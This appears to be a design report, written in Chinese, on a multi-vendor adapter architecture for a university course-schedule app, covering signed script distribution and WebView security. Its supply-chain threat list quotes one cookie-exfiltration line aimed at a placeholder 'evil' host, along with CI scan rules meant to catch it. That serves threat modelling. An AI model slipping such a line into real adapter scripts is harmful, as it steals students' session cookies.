# 教务适配器架构：可演进的「多教务系统」方案

> v1.1 ｜ 2026-10-19 ｜ 性质：**调研 + 设计**（不改 app 源码）
> 标记：**【事实】**=有源码/文档证据；**【建议】**=本报告主张；**【估算】**=待实测
> 结论先行：**原生 Kotlin 为骨架，JS 脚本只「取数」，解析留在设备端；远程只分发脚本+元数据，不分发 DEX/APK。**

---

## 0. 结论卡片（可直接进排期）

| 维度 | 选择 | 理由 |
|---|---|---|
| 主线执行模型 | **HTTP 重放（共享 CookieJar）** | 已在 `ZhengFangAdapter` 验证；快、省电、后台可用 |
| 兜底执行模型 | **前台 WebView 注入 JS 取数** | 仅用户在场时跑；后台不用 |
| 解析位置 | **一律设备端** | 服务端解析＝上传学号/姓名/课表，隐私不可接受 |
| 扩展单元 | **适配器包 = manifest.json + 1 个 .js + fixtures** | 与拾光/小米生态同形，社区可贡献 |
| 分发 | **assets 全量 + 自建源/CDN 增量 + 签名清单** | 离线可用 + 可热修 + 可回滚 |
| 合规红线 | **不做 DEX/APK 动态加载** | 官方文档：远程加载代码违反 Play 政策 |
| 危险动作 | 自动同步默认不删、变化超阈值转人工 | 防「一次解析抖动清空课表」 |

---

## 1. 现状基线（读源码得到的事实）

**【事实】** 抽象极小，且「一所学校冒充通用适配器」：

- [JwAdapter.kt](../../app/src/main/java/com/zhijian/schedule/core/jw/JwAdapter.kt)：`id/name/supports(url)/fetch(client, baseUrl, totalWeeks)`；`JwAdapterRegistry.forUrl()` 未命中**回退 ZhengFangAdapter**，而它的 `supports()` 恒 `true`。
- 错误只有 3 类（`NeedsLogin/ParseFailed/NetworkFailed`），无「验证码/改版/错页面」区分 → UI 给不出可执行动作。
- [ZhengFangAdapter.kt](../../app/src/main/java/com/zhijian/schedule/core/jw/ZhengFangAdapter.kt)：硬编码 3 个候选 URL、`DEFAULT_BASE = https://jw.dgpt.edu.cn/jsxsd/`、按 `kbtable`+`div.kbcontent`+`[01-02节]` 解析 → 学校改版即整体失效。
- [JwSessionRecovery.kt](../../app/src/main/java/com/zhijian/schedule/core/jw/JwSessionRecovery.kt)：不开 WebView，靠 CAS 票据 GET 链（`sso.jsp`→authserver→回跳，≤8 跳）静默重登 → **后台同步的关键资产，必须保留为能力位**。
- [WebViewCookieJar.kt](../../app/src/main/java/com/zhijian/schedule/core/net/WebViewCookieJar.kt)：OkHttp ↔ 系统 `CookieManager` 双向共享。
- [JwSyncManager.kt](../../app/src/main/java/com/zhijian/schedule/sync/JwSyncManager.kt)：自动=`buildPreview(syncMode=true)`→`applyImport(applyConflicts=false)`→通知。
- [ScheduleRepository.buildPreview](../../app/src/main/java/com/zhijian/schedule/core/repository/ScheduleRepository.kt)：匹配键 `(name,day,startSection)`，退化 `(name,day)`；`conflict=manuallyEdited`；**syncMode 下未匹配且未手改的旧课直接 REMOVED** → 「自动同步改坏课表」的唯一入口。
- 导入侧已统一 `CourseDraft`+`ImportPreview`，新架构**复用该管线，不另造模型**。

**【事实】** 技术方案 4.6/4.10 已定：WebView 直连、脚本声明策略、HTTP 重放优先、密码默认不落盘、`IMPORT_SNAPSHOT`、`manuallyEdited` 不被覆盖（[课程表APP技术方案.md](../../课程表APP技术方案.md)）。

---

## 2. 执行模型对比

### 2.1 横向对比

| 模型 | 适用 | 性能【估算】 | 可靠性 | 隐私 | 维护 | 后台 |
|---|---|---|---|---|---|---|
| A 原生 Kotlin per-vendor | 正方/强智/URP/青果/超星 | 0.3–2s | 高（编译期校验），改版要发版 | 最好 | 高（每家一份+测试） | ✅ |
| B 通用表格解析 | 任意「有 table」的课表页（兜底） | 解析 10–50ms | 中低（合并单元格/多课一格/iframe） | 好 | 低 | ✅ |
| C WebView 注入 JS | 前端渲染重（新正方/金智） | 0.5–3s | 中高（脚本热修） | 中（可读 DOM，需白名单） | 中 | ❌ |
| D HTTP 重放 | 登录后 GET 就有 HTML/JSON | 0.3–2s | 高（不依赖渲染） | 好 | 低 | ✅ |
| E 离屏 WebView | 必须执行 JS 且要后台跑 | 冷启 3–8s，80–200MB | 低（被杀/白屏/ANR） | 中 | 高 | ⚠️ 需前台服务 |
| F 服务端解析 | 想藏脚本 | 往返+排队 | 中 | **差**（等同代管账号数据） | 高（运维/合规） | ✅ |

### 2.2 关键判断

**【事实】** 小米把小爱的 **parser 放服务器**，官方理由是「保护你的代码不被抓包」，parser 环境「没有 window」「不支持异步」。
→ **【建议】不照抄**：那是脚本资产保护诉求，不是架构最优；对独立 App 而言等于凭空造一个高敏感数据面，还要承担受托处理义务。设备端解析能拿到 95% 收益。

**【事实】** 拾光把脚本放设备端（`filesDir/repo/resources/*.js` + `evaluateJavascript`），代价是脚本可被读走（MIT 开源，无所谓），收益是零服务端、离线可用。
**【建议】** 采用**三级阶梯**，由 manifest 声明、运行时按序降级：

```
L0 原生 Kotlin（DirectHttp）          ← 默认；后台同步只走这条
L1 脚本 + HTTP 重放（HTTP_REPLAY）
L2 脚本 + WebView（DOM_SCRIPT）       ← 仅前台、用户在场
   ↓ 全失败
L3 通用表格兜底（GenericTable）+ 明确提示「结构可能已变化」
```

不统一成一种模型的原因：A 的可靠性来自「字段写死」，C 的价值是「改版当天社区就能修」——两者服务不同生命周期，硬统一会同时丢优点。

### 2.3 各模型的坑（checklist）

- **B**：`rowspan/colspan` 跨行课；一格多课用 `<hr>`/多 `div`；隐藏重复节点（现有代码已踩：`div.kbcontent1`）；`<iframe>` 内课表（小米模板专门递归取 `iframe/frame`）。
- **C**：脚本常依赖页面自带 jQuery（拾光正方脚本首行 `const $ = window.jQuery`）→ **适配器不得假设宿主页面有第三方库**。
- **D**：`Referer` 必带（现有 `framework/xsMain.jsp`）；http→https 混用；WAF 拦 POST 登录却放行 GET；`JSESSIONID` 与 CAS `CASTGC` 生命周期不同步。
- **E**：Android 12+ 后台启前台服务受限；WebView 首初始化 3s+；无 Activity 时渲染/网络栈不稳；国产 ROM 额外杀进程 → **只在前台用**。
- **F**：除隐私外，学校 WAF 普遍封云厂商 IP 段。

---

## 3. 参考实现拆解

### 3.1 拾光 shiguang_warehouse（最贴近我们）

**【事实】** 仓库结构（[README](https://github.com/ShiGuangSchedule/shiguang_warehouse)）：

```
index/root_index.yaml        # 学校/工具根索引: id, name, initial, resource_folder
resources/<SCHOOL_ID>/
  adapters.yaml              # adapter_id, adapter_name, category, asset_js_path, import_url, maintainer, description
  <script>.js
proto/school_index.proto     # 索引模板 → CI 编译 Protobuf
index-pb-release（孤立分支）  # 只放 school_index.pb
```

- **注册**：PR 到 `pending` → `main` 受保护 → CI 编索引；**未登记 root_index 的学校无法提交**（强约束，避免野生脚本）。
- **发现**：App 只拉 pb 索引 + `resources/**/*.js`（`GitUpdater.kt` 显式跳过 `adapters.yaml`，元数据以 pb 为准）。
- **版本**：`protocol_version > clientMax` → **致命错误并提示升级**；`version_id` 单调，远程更旧 → 终止更新（天然防回滚）。
- **更新**：整仓 git clone 到临时目录再原子替换；支持自定义仓库 URL + token。
- **执行时机**：`assetJsPath` 随导航传入，**用户点按后才注入**，不自动跑。
- **脚本契约**：不是纯函数，而是「命令式 + 桥」：脚本自执行 `runImportFlow()`，调 `window.shiguangBridge.showToast / notifyTaskCompletion`、`await shiguangBridgePromise.showAlert / saveImportedCourses(JSON)`；桥用统一信封 `{action, callbackId, payload}`，原生 `window._shiguangNativeCallback(id, ok, result)` 回 Promise，一套 JS 适配 Android/iOS/CEF（[WebBridgeProtocol.kt](https://github.com/ShiGuangSchedule/shiguangschedule/blob/main/shared/src/commonMain/kotlin/com/xingheyuzhuan/shiguangschedule/ui/schoolselection/web/WebBridgeProtocol.kt)）。数据形如 `{courses:[{name,day,weeks[],teacher,position,startSection,endSection}]}`（[zhengfang_01.js](https://github.com/ShiGuangSchedule/shiguang_warehouse/blob/main/resources/zhengfang_jiaowu/zhengfang_01.js)）。
- **安全反面教材**：`MIXED_CONTENT_ALWAYS_ALLOW` + 第三方 Cookie 全开 + SSL 错误交给用户「继续」（[WebCompatDelegate.kt](https://github.com/ShiGuangSchedule/shiguangschedule/blob/main/shared/src/androidMain/kotlin/com/xingheyuzhuan/shiguangschedule/ui/schoolselection/web/WebCompatDelegate.kt)）。我方现已 `cancel()`，**不要回退**。

### 3.2 小米小爱课程表（最值得抄的形态）

**【事实】** [官方文档](https://open-schedule-prod.ai.xiaomi.com/docs/#/help/)：

| 阶段 | 签名 | 环境 | 约束 |
|---|---|---|---|
| provider | `async scheduleHtmlProvider(iframeContent="", frameContent="", dom=document) → String` | WebView 页面内 | 可 `fetch`；返回 `'do not continue'` = **停止并等用户重新点导入**；可 `await loadTool('AIScheduleTools')` 弹 Alert/Prompt |
| parser | `scheduleHtmlParser(html) → CourseInfo[]` | **服务器** | **不支持 async**；无 window；内置 `$` |
| timer | `async scheduleTimer({providerRes, parserRes})` | 页面内 | **入口函数禁用箭头函数**；返回值最高优先级 |

数据契约极窄：`{name≤50B, position≤50B, teacher≤50B, weeks:1..30, day:1..7, sections:1..30}`，越界裁掉。版本态机：**本地版 →（真机）测试版 → 预览版 → 提审 →（撤审）→ 正式版**。
**【建议】** 抄三件：provider/parser 分离（取数易变、解析稳定）；`do not continue` 软失败语义；作息（timer）与课程分离。**不抄**：parser 上服务器。

### 3.3 下节啥课 baoozak/timetable（注册表 + 学校目录极简范本）

**【事实】** [`parsers/index.js`](https://github.com/baoozak/timetable/blob/main/utils/parsers/index.js) 是静态 `adapters = { [a.id]: a }` + `getAdapter(type)`；每个 parser 为 `export default { id, name, provider: "<JS 字符串>", parse(html) }`（[zhengfang_new.js](https://github.com/baoozak/timetable/blob/main/utils/parsers/zhengfang_new.js)），`provider` 以字符串内嵌、运行时注入 WebView，解析在 App 侧。
[`schools.json`](https://github.com/baoozak/timetable/blob/main/utils/schools.json)（258KB）：`[{id:"pku",name:"北京大学",type:"urp",url:"…"}]` —— **学校目录与适配器解耦**，`type` 只是注册表 key。→ 这正是我们缺的那层。

### 3.4 WakeUp（闭源产品的可验证边界）

**【事实】** 新版闭源商业化；**未检索到官方旧版开源仓库**（GitHub 搜索 0 命中）。可验证的公开材料是第三方对其口令 API 的逆向脚本 [`wakeup课程表/provider.js`](https://github.com/kqakqakqa/xiaoai-schedule-parser/blob/main/wakeup课程表/provider.js)：`GET https://i.wakeup.fun/share_schedule/get?key=<口令>`，UA `okhttp/3.14.9`、头 `version: 243`，`data` 是 5 行 JSON。
**【建议】** 继续走「用户粘贴口令文本」（`WakeUpParser` 已做 Base64/Gzip 容错），**不内置** `i.wakeup.fun` 私有 API（无文档、可随时改、属他人服务）。

### 3.5 ClassIsland（桌面端：文件导入 + 插件市场）

**【事实】** Avalonia 桌面课表展示工具（[repo](https://github.com/ClassIsland/ClassIsland)），课表来源是文件导入：`ExcelImportWindow.xaml` 含「跳过课表导入」「ImportTimeLayoutOnly」→ **作息与课程可分开导入**；扩展走插件市场（[文档](https://github.com/ClassIsland/classisland-docs-next)）。
**【建议】** 借「作息分离」：适配器应能顺带产出 `timeSlots`（同小米 timer），否则每换一所学校都要手调作息。

### 3.6 共性对比

| 项目 | 扩展单元 | 注册 | 发现 | 版本/兼容 | 更新 | 执行位置 |
|---|---|---|---|---|---|---|
| 拾光 | .js + adapters.yaml | PR + CI 编 pb | protobuf 索引 | protocol 硬门槛 + version 单调 | git 全量替换 | 设备 WebView |
| 小爱 | provider/parser/timer | 开发者后台 | 线上版本列表 | 审核态机 | 后台发版 | provider 设备 / **parser 服务器** |
| 下节啥课 | parser 模块 | 代码静态 map | schools.json | 随 App | 随 App | 设备 WebView |
| WakeUp | 闭源 | — | 内置列表 | — | 随 App | 未知 |
| ClassIsland | 文件 + 插件 | 插件清单 | 插件市场 | 插件 API 版本 | 市场 | 不适用 |

---

## 4. 远程分发

### 4.1 通道选型

| 方案 | 可用性 | 成本 | 风险 | 结论 |
|---|---|---|---|---|
| assets 内置 | 100% | 每校 ~几十 KB | 要发版才修 | ✅ **必做**（Top N + 通用兜底） |
| GitHub raw | 时通时断（本次实测多次 `Connection reset`，API 稳定） | 0 | 不可控 | ⚠️ 仅备用 |
| GitHub Release | 中 | 0 | 同域问题 | ✅ 主源之一（可加 CDN 前缀） |
| 自建对象存储 + CDN | 高 | 低 | 需运维 | ✅ **推荐主源**（与 App 更新同源） |
| Gitee/jsDelivr 镜像 | 中高 | 0 | 同步延迟/封禁 | ✅ 第二备用 |

**【建议】** 源列表进 `BuildConfig`，运行时按序探测并记忆最近可用源（复用现有 `update/DownloadSourceSet` 的多源与看门狗思路）。

### 4.2 完整性：hash → 签名 → 清单链

**【事实】** 官方对动态加载的缓解建议即「完整性检查 + 可信来源 + 校验签名」，并明确远程加载代码**违反 Google Play 政策、可能导致应用被暂停**（[动态代码加载](https://developer.android.google.cn/privacy-and-security/risks/dynamic-code-loading)）。
**【建议】** 三级：

1. **P1 SHA-256 清单**：`catalog.json` 每文件带 `sha256`，不匹配即丢弃并回退内置版（挡 CDN 半包/缓存投毒）。
2. **P2 Ed25519 签名清单（minisign 兼容）**：公钥编译进 APK，私钥离线保管（[minisign](https://jedisct1.github.io/minisign/)、[RFC 8032](https://www.rfc-editor.org/rfc/rfc8032)）。**注意** `minSdk 26`：不假设平台 JCA 有 Ed25519，**自带验证实现**（Tink/BouncyCastle/纯 Kotlin）并真机验证。
3. **P3 TUF 式角色分离**（可选）：root/targets/snapshot/timestamp 分钥 + `version` 单调 + 过期时间，防重放与冻结（[TUF](https://theupdateframework.github.io/specification/latest/)）。个人项目只借「版本单调 + 清单过期」。

### 4.3 版本兼容 / 灰度 / 回滚

**【事实】** 拾光：`protocol_version` 超限 → 致命并提示升级；`remote.version_id < local` → 拒绝更新（`GitUpdater.kt`）。值得照抄。
**【建议】** `catalog.json` 增加：`schema / catalogVersion / minAppVersionCode / generatedAt / expiresAt / rollout{percent,bucketSalt}`；适配器条目带 `id/version/minProtocol/path/sha256/status/channels`。

- **灰度**：`sha256(installId + bucketSalt) % 100 < percent`，5%→50%→100%；**同设备永远同桶**。
- **回滚**：内置版本永不删；远程包写 `filesDir/jw/<id>/<version>/`，指针 `current.json` 原子切换；`status:"broken"` 或连续失败即回退上一版/内置版；保留 2 份后 GC。
- **离线**：冷启动先用内置目录（可搜可导），后台拉增量；**离线不得标记「适配器不存在」**。

### 4.4 供应链风险（按概率）

1. **PR 投毒**（一行 `fetch('https://evil/?c='+document.cookie)`）→ 脚本无网络桥 + action 白名单 + CI 静态扫描（禁外域 `fetch/XHR`、禁 `eval/Function`、禁 cookie 外发）。
2. **账号被盗改 Release** → 私钥离线；CI 只发「签名请求」，不持私钥。
3. **CDN/镜像劫持** → sha256 + 签名 + 可选 pinning。
4. **降级攻击** → `version` 单调 + `expiresAt`。
5. **同形域名/id 抢注** → `id` 与 `hosts` 白名单绑定，`hosts` 限 `.edu.cn` 或用户手工添加域。

### 4.5 动态加载 DEX/APK：明确不建议

**【事实】** 除 Play 政策外，Android 14 起 targetSdk≥34 要求**动态加载的文件必须只读**，否则抛异常（[行为变更](https://developer.android.google.cn/about/versions/14/behavior-changes-14)）；我方 `targetSdk = 36`。
**【建议】** 写死：**适配器 ≠ 插件**。要更强表达力就扩 JS 沙箱能力（DOM 查询、`fetch` 代理到原生 OkHttp、正则/JSON 工具），不加载 DEX。确有原生插件诉求 → 随 App 发版 + 服务端开关。

---

## 5. WebView 登录与安全

### 5.1 Cookie 与 CAS

**【事实】** 现状：`CookieManager` ↔ OkHttp 双向；CAS 链手动逐跳（禁自动重定向）并识别 `location.href=`/`meta refresh`。
**【建议】** 固化为「会话层」：① Cookie 只交 `baseUrl` 同站（拒绝把教务 Cookie 发往第三方域）；② `CASTGC`（免登录票据）单独记账，manifest 声明 `session.recover = cas-get-chain|none`；③ 恢复失败分三类可诊断：票据过期（通知点一下）/ WAF 拦截（提示校园网或 WebVPN，现有文案已有）/ 未知。

### 5.2 验证码 / MFA

**【建议】** 能力位 `login.captcha: none|image|slider|sms`。`image` **不做识别绕过**：WebView 里让用户自己过，再走 HTTP 重放。后台遇验证码**立即停止重试**并发「需重新登录」通知（避免撞风控）。

### 5.3 证书错误

**【事实】** 现状 `onReceivedSslError → handler.cancel()`（正确）；拾光让用户「继续」（危险）。
**【建议】** 保持一律 cancel，只留两个出口：校园自签 CA → 引导「安装系统证书」；WebVPN 证书不匹配 → 引导官方客户端。**不做 `X509TrustManager` 放行**。

### 5.4 多账号

**【建议】** 数据加 `accountId`（`jwUrl + 学号哈希`）：WebView 侧用 `setDataDirectorySuffix`（API 28+）或「切号即清 Cookie」；存储侧 `JwAccount(id,label,baseUrl,adapterId,lastLoginAt,cookieScope)`；密码默认不存。

### 5.5 加固清单（对照官方建议）

**【事实】** 官方：不用 JS 就别 `setJavaScriptEnabled`；`addJavascriptInterface` **只用于输入可信的页面**，通常建议仅用于 APK 内含 JS；不要在设备上存用户名密码（[安全提示](https://developer.android.google.cn/privacy-and-security/security-tips)）。我们的页面天生不可信 →

| 项 | 取值 |
|---|---|
| `allowFileAccess` / `allowContentAccess` / `*FromFileURLs` | **false** |
| `mixedContentMode` | `COMPATIBILITY`（勿 `ALWAYS_ALLOW`） |
| 第三方 Cookie | 仅登录域需要时开，导入完成即关 |
| JS 桥 | 单例、单对象名、**方法白名单**；暴露 `exec/invoke` 视为漏洞 |
| 桥域名校验 | 每次调用校验 `webView.url.host == scopeHost` |
| 文件选择/下载 | `onShowFileChooser`/`setDownloadListener` 一律拒绝 |
| 新窗口 | 收进当前 WebView（合理），但 scheme 仅 http(s) |
| 调试 | release 禁 `setWebContentsDebuggingEnabled` |
| 日志 | URL 脱敏（去 `ticket/token`），Cookie 永不打印 |

### 5.6 凭据

**【建议】** 默认不存，靠 CAS 票据续命；「记住密码」显式开启 → Keystore 加密，**只用于 WebView 表单填充**，不用于构造登录请求（避免与验证码/风控冲突）；绝不把密码传到自建服务器。

### 5.7 后台无 WebView 的会话恢复

| 情形 | 策略 | 体验 |
|---|---|---|
| `CASTGC` 有效、`JSESSIONID` 过期 | **GET 链重放**（现有实现） | 无感 ✅ |
| 票据过期 + 开了记住密码 | 后台不自动登录；发「一键续期」通知，进 WebView 预填 | 一次点按 |
| 票据过期 + 无密码 | 通知「同步已暂停」；连续 3 天失败停发 | 明确 |
| 验证码/风控 | 停重试，标 `LoginBlocked`，7 天复位 | 明确 |
| 只能 WebView 取数 | 后台不做，改「每天首次打开 App 时静默刷新」 | 可接受 |

**【事实】** `PeriodicWorkRequest` 有最小周期常量 `MIN_PERIODIC_INTERVAL_MILLIS` 且为 deferrable（[API](https://developer.android.google.cn/reference/androidx/work/PeriodicWorkRequest)）→ Doze/省电下**不保证准点**，文案别承诺「每天 6:00」。
**【建议】** 后台任务**禁止创建 WebView**；需 WebView 的适配器声明 `backgroundSafe=false`，调度器跳过并降级为「打开 App 时刷新」。

---

## 6. 解析质量与测试

### 6.1 fixture 单测

**【事实】** 现有 `ZhengFangParseTest` / `ParserTest` 系列已证明「HTML 进 → Draft 出」可测。
**【建议】** 每适配器带 `fixtures/<id>/`：`20xx-xx_kbtable.html`（真实页，姓名→张三/学号→2026001）、`expected.json`、`login_expired.html`。断言四类：课程数；关键字段；**幂等**（两次 parse 哈希一致）；**错误分类**（失效页→`NeedsLogin`，改版页→`StructureChanged` 而非空列表）。
CI 规则：**fixture 变更必须在 PR 里贴 diff 摘要**，防止「改期望值让测试过」。

### 6.2 指纹

**【建议】** 指纹 = `sha256(规范化后的结构特征)`，特征只取稳定项：`vendorHint`（`jwglxt/jsxsd/URP/强智`）、`titleHash`、`tableShape`（`kbtable:rows=7,cols=8,th+td`）、`scriptHints`（`xskb_list.do`、`xnm/xqm`）。
用途：① `match()` 打分（不只看域名）；② 改版检测（指纹变但课程数正常→告警；课程数 0→`StructureChanged`）；③ 同指纹失败率＝该学校健康度。

### 6.3 上报

**【建议】** 默认**仅本地** `AdapterHealth`（时间/适配器/指纹/错误码/成功/课程数），设置页可查可导出。匿名上报为显式 opt-in，只传 `adapterId+version/指纹/错误码/课程数/App 版本`，**不含 HTML、姓名学号、URL query**；要传 HTML 必须「用户点帮助改进 → 预览脱敏片段 → 确认」。

### 6.4 健康度状态机

```
STABLE --(连续2次 StructureChanged)--> SUSPECT --(再来1次)--> BROKEN（停自动同步，仅手动+提示）
BROKEN --(新版本脚本成功)--> STABLE
```
**【建议】** 目录 `status` 与本地健康度取交集：远程说 stable、本地 BROKEN 也不自动同步。

### 6.5 diff 幂等性

**【事实】** 现状「相同」判定含 `room/teacher/sections/weekMask` 全等，匹配键 `(name,day,startSection)`。
**【风险】** 三类「假变更」：① 空白/全角（`"A101 "`、`（东）` vs `(东)`）；② 教师多人顺序（`张三,李四` vs `李四,张三`）；③ 周次写法（`1-16周(单)` vs 枚举）。
**【建议】** 在归一化层统一 NFKC + trim + 去零宽 + 列表排序 + 周次由 `WeekMask` 输出规范串；单测：**同 fixture 两次 `buildPreview`，第二次必须全 UNCHANGED**。

### 6.6 「自动同步改坏课表」五道闸

| 闸 | 规则 | 触发后 |
|---|---|---|
| G1 合法性 | `courses>0`；`day∈1..7`；`section∈1..12`；`weeks⊆1..totalWeeks`；条数/耗时在合理区间 | 不应用，标 `StructureChanged` |
| G2 变化预算 | `removed > max(3,25%)` 或 `added>40%` 或总数降 >25% | **不自动应用**，发「变化较大请确认」 |
| G3 手改保护 | `manuallyEdited` 不覆盖**也不删除**；同名同日冲突标 `conflict` | 现状已做覆盖，补删除保护 |
| G4 快照 | 应用前存 `IMPORT_SNAPSHOT`（JSON+时间戳+adapterVersion），保留 5 份 | 设置页「回滚到上次同步前」 |
| G5 熔断 | 同适配器连续 2 次 G1/G2 | 停自动同步 + 提示更新 |

**【建议】** 加「首同步不删」：本地课表为空/首次导入时 `syncMode` 只增不删。

---

## 7. 具体设计

### 7.1 `JwAdapter` v2（Kotlin 草图）

```kotlin
interface JwAdapter {
    val manifest: AdapterManifest
    fun match(probe: SiteProbe): Int          // 0..100 打分，替代 boolean supports()
    suspend fun fetch(ctx: FetchContext, req: FetchRequest): FetchResult
}

data class AdapterManifest(
    val id: String, val version: String, val protocol: Int, val name: String,
    val hosts: List<String>, val capabilities: Capabilities, val source: AdapterSource,
)

data class Capabilities(
    val login: List<LoginKind>,              // PASSWORD_FORM, SSO_CAS, QR, NONE
    val captcha: CaptchaKind,                // NONE, IMAGE, SLIDER, SMS
    val strategies: List<FetchStrategy>,     // HTTP_REPLAY, DOM_SCRIPT, GENERIC_TABLE
    val backgroundSafe: Boolean,             // 后台可执行？
    val provides: Set<Provision>,            // COURSES, TIME_SLOTS, GRADES
    val sessionRecovery: SessionRecovery,    // NONE, CAS_GET_CHAIN, COOKIE_ONLY
)

sealed class JwError(val retryable: Boolean, val action: UserAction) {
    object NeedsLogin      : JwError(true,  OPEN_WEBVIEW)
    object CaptchaRequired : JwError(false, OPEN_WEBVIEW)
    object MfaRequired     : JwError(false, OPEN_WEBVIEW)
    object WrongPage       : JwError(false, OPEN_WEBVIEW)      // 用户在别的页面点了抓取
    data class StructureChanged(val fingerprint: String) : JwError(false, REPORT_OR_UPDATE)
    data class Http(val code: Int) : JwError(code >= 500, RETRY_LATER)
    object NetworkDown     : JwError(true,  RETRY_LATER)
    object EmptyResult     : JwError(false, CHECK_SEMESTER)
    object NotSupported    : JwError(false, CHOOSE_OTHER_METHOD)
}
```

**【建议】** 兼容期留 `LegacyJwAdapter`；`forUrl` 改为按 `match()` 排序取最高分，**分数 0 才用通用兜底，绝不默认回退某一家**（现状 `supports()==true` 是隐性 bug 源）。

### 7.2 `AdapterRegistry` + `SchoolCatalog`

```kotlin
class AdapterRegistry(catalog: SchoolCatalog, builtin: List<JwAdapter>, remote: Map<String, JwAdapter>) {
    fun resolve(probe: SiteProbe): ResolvedAdapter = /* 先按 hosts 过滤，再按 match() 降序 */
        candidates.firstOrNull()?.let { ResolvedAdapter(it.first, it.second) }
            ?: ResolvedAdapter(GenericTableAdapter(), 1)   // UI 明确提示「通用模式」
}
```

```json
// assets/jw/catalog.json
{ "schema": 2,
  "schools": [{ "id": "dgpt", "name": "东莞职业技术学院", "aliases": ["东莞职院"],
                "hosts": ["jw.dgpt.edu.cn"], "adapterId": "zhengfang",
                "adapterVersion": "3", "priority": 100, "status": "stable" }],
  "adapters": [{ "id": "zhengfang", "name": "正方教务（jsxsd/jwglxt）", "version": "3",
                 "hosts": ["*.edu.cn"], "strategies": ["HTTP_REPLAY","DOM_SCRIPT"],
                 "capabilities": { "login": ["SSO_CAS","PASSWORD_FORM"], "captcha": "IMAGE",
                                   "backgroundSafe": true, "provides": ["COURSES","GRADES"],
                                   "sessionRecovery": "CAS_GET_CHAIN" } }] }
```

`hosts` 的 `*.edu.cn` **只用于打分**，不能当信任依据；桥校验用精确 host + 用户确认的 `baseUrl`。

### 7.3 JS 脚本契约

**原则**：脚本只「取数（+可选结构化）」，不落库、不直连网络（走宿主代理）、不弹原生 alert。

```js
// adapters/zhengfang/zhengfang_v9.js
exports.manifest = { id:"zhengfang", version:"3", protocol:2,
                     hosts:["jw.dgpt.edu.cn"], stages:["probe","collect","parse"],
                     needs:["jquery"] };            // 声明依赖，缺失即判失败

exports.probe = ({ url, title, htmlSample }) => ({ score: url.includes("/jsxsd/") ? 90 : 0 });

exports.collect = async (ctx) => {
  const html = await ctx.http.get(ctx.baseUrl + "xskb/xskb_list.do",
    { headers: { Referer: ctx.baseUrl + "framework/xsMain.jsp" } });
  if (ctx.login.isLoginPage(html)) return { error: "NEEDS_LOGIN" };
  return { kind: "html", url: "...", body: html };
};

exports.parse = (raw) => ({ schemaVersion: 2, courses: [ /* … */ ] }); // 可省略，交宿主 Jsoup
```

**桥（白名单，逐条实现，无通用 `invoke`）**

```kotlin
class JwJsBridge(private val scopeHost: String, private val onEvent: (BridgeEvent) -> Unit) {
    @JavascriptInterface fun toast(msg: String) { if (allowed()) onEvent(Toast(msg)) }
    @JavascriptInterface fun log(level: String, msg: String) { if (allowed()) onEvent(Log(level, redact(msg))) }
    @JavascriptInterface fun confirm(title: String, body: String, cbId: String) { /* … */ }
    @JavascriptInterface fun chooseSemester(json: String, cbId: String) { /* … */ }
    @JavascriptInterface fun submitDraft(json: String) { /* 只进预览，不直接落库 */ }
    @JavascriptInterface fun report(code: String, detail: String) { /* … */ }
    private fun allowed() = currentUrlHost() == scopeHost
}
```

**输出 Schema（宿主强校验，失败即 `StructureChanged`）**

```json
{ "schemaVersion": 2,
  "courses": [{ "name": "高等数学", "teacher": "张三", "room": "A101",
                "day": 1, "startSection": 1, "endSection": 2,
                "weeks": [1,2,3], "weeksText": "1-3周", "note": "" }],
  "timeSlots": { "totalWeeks": 20,
                 "sections": [{ "section": 1, "start": "08:20", "end": "09:05" }] },
  "meta": { "fingerprint": "zhengfang-v9-kbtable", "semester": "2026-2027-1" } }
```

校验要点：`courses.minItems=1`；`day∈1..7`；`startSection≤endSection∈1..30`；`weeks` 元素 `1..30` 且去重；`start/end` 匹配 `^\d{2}:\d{2}$`；`name≤60`。
**【建议】** 输出用 `weeks:Int[]` 而非 `weekMask` 字符串（可校验、可跨系统比较），由宿主 `WeekMask.encode()` 生成现状字段，`CourseDraft` 零迁移。

### 7.4 目录结构

```
app/src/main/assets/jw/{catalog.json, adapters/zhengfang/…js}
app/src/main/java/com/zhijian/schedule/core/jw/
  JwAdapter.kt                  # v2 接口 + JwError + Capabilities
  registry/{AdapterRegistry,SchoolCatalog,CatalogRepository}.kt   # 目录/远程/签名/灰度
  runtime/{ScriptAdapter,JsRuntime,HttpProxy}.kt                  # 脚本执行 + 桥 + 受限 fetch
  runtime/session/CasRecovery.kt
  parse/{GenericTableAdapter,PageFingerprint}.kt
  diag/AdapterHealth.kt
app/src/test/resources/fixtures/<adapterId>/
```

### 7.5 现有代码怎么迁

| 现有 | 新位置 | 动作 |
|---|---|---|
| `ZhengFangAdapter`（含东莞职院硬编码） | `adapters/zhengfang` + `catalog[dgpt]` | `DEFAULT_BASE` 移入 catalog；`supports()==true` → `match()` 打分 |
| `JwSessionRecovery` | `runtime/session/CasRecovery.kt` | 逻辑不动，作为 `sessionRecovery` 实现 |
| `GradeFetcher/GradeParser` | 同目录，挂 `provides: GRADES` | `JwSyncManager` 按能力调用 |
| `JwAdapterRegistry.forUrl` | `AdapterRegistry.resolve` | 语义从「回退正方」改为「兜底通用 + 明确提示」 |

---

## 8. 分阶段落地与验收

| 阶段 | 内容 | 验收标准 | 预估 |
|---|---|---|---|
| **P0 护栏**（不动架构） | G1/G2/G4/G5 + `IMPORT_SNAPSHOT` + 阈值通知 | ① 单测：解析回 3 门而库中 20 门 → 不自动应用；② 可回滚上一快照；③ 连续 2 次异常后自动同步停止 | 2–3 人日 |
| **P1 接口与目录** | v2 接口、Registry、SchoolCatalog、GenericTable、指纹 | ① 正方行为 100% 不变（同 fixture diff 为空）；② 未知域名走通用模式且 UI 明示；③ 新增 1 校 = 改 catalog + 1 文件 | 3–5 人日 |
| **P2 脚本执行器** | ScriptAdapter(DOM_SCRIPT)、桥白名单、HttpProxy、1 校试点 | ① 桥仅 6 方法，host 不符全拒绝（有测试）；② 脚本无法发起白名单外请求；③ 试点校手动导入成功且与重放结果一致 | 5–8 人日 |
| **P3 远程分发** | 自建源+GitHub 备用；sha256→Ed25519；灰度；回滚 | ① 断网仍可用内置目录；② 篡改 1 字节即拒绝并回退；③ 灰度 10% 生效、其余不变；④ 手动回滚 1 分钟内 | 3–4 人日 |
| **P4 质量闭环** | fixture CI、健康度页、匿名上报 | ① 每适配器 ≥3 fixture；② 幂等测试过；③ 设置页可见健康度；④ 上报内容经脱敏审计 | 2–3 人日 |

**里程碑**：P0+P1 先合（用户无感、风险归零），再开 P2 试点；P3 前不要对外宣称「支持 N 所学校」。

---

## 9. 风险与待验证

